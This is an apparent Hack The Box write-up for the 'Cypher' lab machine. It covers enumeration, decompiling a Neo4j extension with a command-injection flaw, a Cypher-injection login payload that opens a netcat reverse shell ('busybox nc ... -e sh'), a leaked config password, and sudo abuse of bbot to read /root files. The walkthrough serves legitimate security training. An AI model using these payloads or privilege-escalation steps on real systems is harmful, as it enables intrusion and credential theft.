---
title: Cypher HackTheBox
date: 2025-03-02 13:00:00 +0700
layout: post
categories:
  - Hack The Box
tags:
  - writeups
  - ctf
  - medium
  - hackthebox
  - linux
image: 
    path: /assets/img/sample/cypher/cypher.jpg
    alt: Cypher Machine HackTheBox
---

## Introduction

Cypher on HackTheBox is an important aspect of the cybersecurity CTF challenges. It is a CTF on linux that involves enumeration, google dorking, decomplier java file, command injection and cypher injection.


## Enumeration

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Cypher]
└─$ nmap -A 10.10.11.57

Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-01 22:58 EST
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Nmap scan report for cypher.htb (10.10.11.57)
Host is up (0.045s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: GRAPH ASM
|_http-server-header: nginx/1.24.0 (Ubuntu)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

Add `cypher.htb` into /etc/hosts file.

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Cypher]
└─$ echo "10.10.11.57   cypher.htb" | sudo tee -a /etc/hosts
[sudo] password for trit: 
10.10.11.57   cypher.htb
~~~


![](/assets/img/sample/cypher/test.png)



Download file to attack machine kali Linux.

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Cypher]
└─$ wget http://cypher.htb/testing/custom-apoc-extension-1.0-SNAPSHOT.jar
--2025-03-02 01:19:41--  http://cypher.htb/testing/custom-apoc-extension-1.0-SNAPSHOT.jar
Resolving cypher.htb (cypher.htb)... 10.10.11.57
Connecting to cypher.htb (cypher.htb)|10.10.11.57|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6556 (6.4K) [application/java-archive]
Saving to: ‘custom-apoc-extension-1.0-SNAPSHOT.jar’

custom-apoc-extension-1.0-SNAPSHOT.j 100%[===================================================================>]   6.40K  --.-KB/s    in 0.003s  

2025-03-02 01:19:41 (2.05 MB/s) - ‘custom-apoc-extension-1.0-SNAPSHOT.jar’ saved [6556/6556]
~~~

## Decomplier file

First, I unzip the **custom-apoc-extension-1.0-SNAPSHOT.jar** file.


~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Cypher]
└─$ unzip custom-apoc-extension-1.0-SNAPSHOT.jar 
Archive:  custom-apoc-extension-1.0-SNAPSHOT.jar
creating: META-INF/
inflating: META-INF/MANIFEST.MF    
creating: com/
creating: com/cypher/
creating: com/cypher/neo4j/
creating: com/cypher/neo4j/apoc/
inflating: com/cypher/neo4j/apoc/CustomFunctions$StringOutput.class  
inflating: com/cypher/neo4j/apoc/HelloWorldProcedure.class  
inflating: com/cypher/neo4j/apoc/CustomFunctions.class  
inflating: com/cypher/neo4j/apoc/HelloWorldProcedure$HelloWorldOutput.class  
creating: META-INF/maven/
creating: META-INF/maven/com.cypher.neo4j/
creating: META-INF/maven/com.cypher.neo4j/custom-apoc-extension/
inflating: META-INF/maven/com.cypher.neo4j/custom-apoc-extension/pom.xml  
inflating: META-INF/maven/com.cypher.neo4j/custom-apoc-extension/pom.properties 
~~~

Next, I decomplie the **com/cypher/neo4j/apoc/CustomFunctions.class** file [here](https://www.decompiler.com/).


~~~
package com.cypher.neo4j.apoc;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;
import java.util.stream.Stream;
import org.neo4j.procedure.Description;
import org.neo4j.procedure.Mode;
import org.neo4j.procedure.Name;
import org.neo4j.procedure.Procedure;

public class CustomFunctions {
   @Procedure(
      name = "custom.getUrlStatusCode",
      mode = Mode.READ
   )
   @Description("Returns the HTTP status code for the given URL as a string")
   public Stream<com.cypher.neo4j.apoc.CustomFunctions.StringOutput> getUrlStatusCode(@Name("url") String url) throws Exception {
      if (!url.toLowerCase().startsWith("http://") && !url.toLowerCase().startsWith("https://")) {
         url = "https://" + url;
      }

      String[] command = new String[]{"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
      System.out.println("Command: " + Arrays.toString(command));
      Process process = Runtime.getRuntime().exec(command);
      BufferedReader inputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
      BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
      StringBuilder errorOutput = new StringBuilder();

      String line;
      while((line = errorReader.readLine()) != null) {
         errorOutput.append(line).append("\n");
      }

      String statusCode = inputReader.readLine();
      System.out.println("Status code: " + statusCode);
      boolean exited = process.waitFor(10L, TimeUnit.SECONDS);
      if (!exited) {
         process.destroyForcibly();
         statusCode = "0";
         System.err.println("Process timed out after 10 seconds");
      } else {
         int exitCode = process.exitValue();
         if (exitCode != 0) {
            statusCode = "0";
            System.err.println("Process exited with code " + exitCode);
         }
      }

      if (errorOutput.length() > 0) {
         System.err.println("Error output:\n" + errorOutput.toString());
      }

      return Stream.of(new com.cypher.neo4j.apoc.CustomFunctions.StringOutput(statusCode));
   }
}
~~~

Notice the code below.

~~~  
public class CustomFunctions {
   @Procedure(
      name = "custom.getUrlStatusCode",
      mode = Mode.READ
   )
   @Description("Returns the HTTP status code for the given URL as a string")
   public Stream<com.cypher.neo4j.apoc.CustomFunctions.StringOutput> getUrlStatusCode(@Name("url") String url) throws Exception {
      if (!url.toLowerCase().startsWith("http://") && !url.toLowerCase().startsWith("https://")) {
         url = "https://" + url;
      }

      String[] command = new String[]{"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
      System.out.println("Command: " + Arrays.toString(command));
      Process process = Runtime.getRuntime().exec(command);
      BufferedReader inputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
      BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
      StringBuilder errorOutput = new StringBuilder();

      String line;
      while((line = errorReader.readLine()) != null) {
         errorOutput.append(line).append("\n");
      }
   }
}
~~~


This code contains a critical `Cypher Injection` vulnerability, allowing an attacker to execute arbitrary commands on the server.


~~~ 
{"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url}
~~~


## **Explain of the Command**

| **Component**           | **Meaning** |
|------------------------|------------|
| `/bin/sh`             | Executes the command in a shell environment (`sh` or `bash`). |
| `-c`                 | Tells the shell to execute the following command as a string. |
| `curl`               | Sends an HTTP request to a URL. |
| `-s`                 | **Silent mode**: Hides progress and error messages. |
| `-o /dev/null`       | Redirects the response body to `/dev/null` (discards it). |
| `--connect-timeout 1` | Sets the maximum connection time to **1 second**. |
| `-w %{http_code}`    | Outputs only the **HTTP status code** (e.g., `200`, `404`). |
| `<URL>`              | The target website being checked. |

> You can prefer [neo4j](https://neo4j.com/developer/kb/protecting-against-cypher-injection/) and this [blog](https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits).
{: .prompt-info }


Edit shell below and past into **username** field.


~~~ 
    "a' return h.value as a UNION CALL custom.getUrlStatusCode("http://10.10.x.x;busybox nc 10.10.x.x 4444 -e sh;#") YIELD statusCode AS a RETURN a;//"
~~~



Another command line, I execute this command to listen port 4444.


~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Cypher]
└─$ nc -lnvp 4444       
listening on [any] 4444 ...
connect to [10.10.14.185] from (UNKNOWN) [10.10.11.57] 52718
id
uid=110(neo4j) gid=111(neo4j) groups=111(neo4j)
ls
bin
bin.usr-is-merged
boot
cdrom
dev
etc
home
lib
lib.usr-is-merged
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
sbin.usr-is-merged
srv
sys
tmp
usr
var
cd /home
ls
graphasm
cd graphasm
ls
bbot_preset.yml
user.txt
cat user.txt
cat bbot_preset.yml
targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.***************

~~~

## Connect SSH Server

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Cypher]
└─$ ssh graphasm@10.10.11.57
graphasm@10.10.11.57's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-53-generic x86_64)

graphasm@cypher:~$ ls
bbot_preset.yml  user.txt
graphasm@cypher:~$ cat user.txt 
~~~

I prefre about `bbot` tool this [website](https://www.blacklanternsecurity.com/bbot/Stable/modules/custom_yara_rules/).

~~~
sudo /usr/local/bin/bbot --custom-yara-rules /root/root.txt
~~~

~~~
sudo /usr/local/bin/bbot -cy /root/root.txt -d --dry-run
~~~

~~~ shell
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
graphasm@cypher:~$ cat /usr/local/bin/bbot
#!/opt/pipx/venvs/bbot/bin/python
# -*- coding: utf-8 -*-
import re
import sys
from bbot.cli import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
graphasm@cypher:~$ sudo /usr/local/bin/bbot --custom-yara-rules /root/root.txt -d 
~~~

***Thank you for readling this far! I hope this writeup helps you in your learning and research.***